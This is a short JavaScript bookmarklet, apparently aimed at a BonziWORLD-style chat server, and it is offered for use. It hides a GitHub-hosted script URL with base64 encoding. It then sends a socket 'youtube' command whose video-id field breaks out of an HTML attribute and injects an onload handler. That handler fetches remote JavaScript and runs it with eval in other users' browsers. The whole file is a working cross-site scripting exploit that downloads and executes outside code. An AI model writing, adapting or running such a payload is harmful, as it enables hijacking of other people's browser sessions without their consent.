javascript:(function(){
    const jvnm = prompt("Enter script name (UPPERCASE ONLY):");
    const vidid = prompt("YTVideo id, (OPTIONAL)") || "";
    
    const baseUrl = atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v');
    const extension = atob('Lmpz'); 

    if (jvnm) {
        socket.emit('command', { 
            list: [
                'youtube', 
                `"${vidid}" onload="fetch('${baseUrl}' + '${jvnm.toUpperCase()}' + '${extension}').then(r=>{if(r.ok)return r.text();else throw new Error()}).then(t=>eval(t)).catch(e=>console.log('Script load failed.'))" u="`
            ]
        });
    }
})();
